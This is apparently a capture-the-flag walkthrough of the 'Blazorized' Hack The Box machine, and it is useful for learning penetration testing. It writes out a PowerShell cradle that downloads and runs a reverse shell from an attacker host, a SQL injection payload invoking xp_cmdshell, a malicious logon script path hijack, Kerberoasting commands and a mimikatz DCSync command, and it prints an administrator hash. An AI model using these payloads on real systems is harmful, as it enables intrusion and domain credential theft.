# Blazorized Machine Writeup

At the moment of making this write up this box is my favorite, that is why I am choosing to make it my first write up. Any tips or critiques will be of most delight

Starting the box with an ip of 10.10.11.22

First step, nmap 

![nmap](https://github.com/user-attachments/assets/d062b7f2-b6ae-46b7-887c-62eaeb930468)

We see port 80 is open and redirecting to blazorized.htb

Adding that to our /etc/hosts we can access the page

![site](https://github.com/user-attachments/assets/83cd1caa-56d2-4595-9fc5-4ac2a186a939)


At first nothing interesting, only at the bottom we find the site was made with blazor. This implies the existence of dll files that can be decompiled. 

But first let's run a ffuf for subdomains


![image](https://github.com/user-attachments/assets/31ca6252-cbac-48fc-95c7-0e88e4244b4c)


We get a hit on admin.blazorized.htb, adding it to /etc/hosts we find a login page

Now it's a good idea to take a look at the dll files and what info they can give, so to access the admin panel and continue from there

Taking a look at the files that begin with Blazorized we see an interesting file only generated in the check_update endpoint

![image](https://github.com/user-attachments/assets/1a934bab-7625-4e43-af23-4acc724717ae)

Dowloading it with

```
curl http://blazorized.htb/Blazorized.Helpers.dll -o Blazorized.Helpers.dll
```

Next step is to decompile it

## If you want to learn some more watch the following video

[https://www.youtube.com/watch?v=Xx1eMlscXrQ&t=536](https://www.youtube.com/watch?v=Xx1eMlscXrQ)

### Continuing the Write up

To send it over to my windows box I did

```
sudo impacket-smbserver -smb2support share $(pwd)
```

and the hit my kali local ip with Win+R, after that you can open powershell and run ildasm

On the decompiled dll file we can find this:

![decompiled](https://github.com/user-attachments/assets/7a3948ee-cd9e-4a75-a11f-cf233c0a9d95)


With this information we can create a jwt and use it to log in the admin panel.

I left the python script I used in this repo name generate_token.py

Adding it to the browser local storage and refreshing the admin page will get you in

On the admin page the check duplicate page suffers from sql injection 

![sqlinjection](https://github.com/user-attachments/assets/ed84284f-ef61-4bb0-92ca-ab02a57b08dc)

Using this we can get a shell

I used nishang's Invoke-PowershellTcpOneline.ps1 and did a web cradle with

```
IEX(New-Object Net.WebClient).downloadString('http://<your_ip>:8000/shell.ps1')
```
I then encoded the cradle in base64 with 

```
cat cradle | iconv -t utf-16le | base64 -w0
```

And sent the following on the admin panel

```
Foxer'; EXEC xp_cmdshell 'powershell -enc <base63_cradle>'; -- -
```

This gets us a shell as nu_1055
![first_shell](https://github.com/user-attachments/assets/462b5a12-177d-4f29-87b5-90106c5e16d2)


This user already has the user flag

![user_flag](https://github.com/user-attachments/assets/60ebf0af-8869-40a2-921a-47a2b92b3894)


## Shell as nu_1055

First let's run Sharphound and get some data 
After running sharphound stand a smbserver and grab the zip file
Taking a look at nu_1055 we see he has WriteSPN permissions on rsa_4810


![bloodhound1](https://github.com/user-attachments/assets/ce2c378f-add4-47a1-808c-62cf5d15ba89)

We'll need to add PowerView to the box with
```
IEX(New-Object Net.WebClient).downloadString('http://<your_ip>:8000/PowerView.ps1')
```

Using bloodhound's suggested windows abuse, we can do the following commands

```
Set-DomainObject -Identity rsa_4810 -SET @{serviceprincipalname='foxer/writeup'}
Invoke-Kerberoast
```

![rsa_4810_hash](https://github.com/user-attachments/assets/057cc587-4543-4dd1-b223-c70b884f87d0)

And as you can see we get a hash

Cracking it we get rsa_4810s password and we can winrm with it

![rsa_4810_pass](https://github.com/user-attachments/assets/8a2d1bd0-a26d-4447-9d61-5bc6e7812933)

## Shell as rsa_4810

After accessing the user it get's a bit harder since bloodhound doesn't really give us any direct ideas, however looking at the Users directorie we see there's only user ssa_6010 remaining, apart from Administratr

However we can do the following
```
Find-InterestingDomainAcl | ConvertTo-Json
```
Looking for SSA_6010 we can see that rsa_4810 can change the script path for user ssa_6010

![script_path](https://github.com/user-attachments/assets/9e229c76-6a6e-4110-8f47-ffaf643f9ddc)

So we can change a script path, now we need only figure out what directory we can write to

Using accesschk64 we find out it's
```
Windows\SYSVOL\domain\scripts\A32FF3AEAA23
```
Let's make a file that catches our cradle, so do 
```
echo "powershell - enc <base64_cradle>" | Out-File -Filepath fox.bat -Encoding ASCII
Set-ADUser -Identity SSA_6010 -ScriptPath 'A32FF3AEAA23\fox.bat'
```
Open a listener and a web server to cat the shell.ps1 file and we get a shell as ssa_6010


![ssa_6010_shell](https://github.com/user-attachments/assets/bcc46b27-db42-4831-be1e-e5b7e4f9701e)
## Shell as ssa_6010
Finally, looking at bloodhound we see ssa_6010 can perform a DCSynv attack on the domain

We can do this with mimikatz and get the Administrator hash

```
.\mimikatz.exe "lsadump::dcsync /domain:blazorized.htb /user:administrator" exit
```

![admin_hash](https://github.com/user-attachments/assets/bb8a4b2c-ae33-428e-a932-5148cb2bcb62)

f55ed1465179ba374ec1cad05b34a5f3 is the admins hash

Using winrm we cat get root.txt

### Thanks to ippsecs video on the box
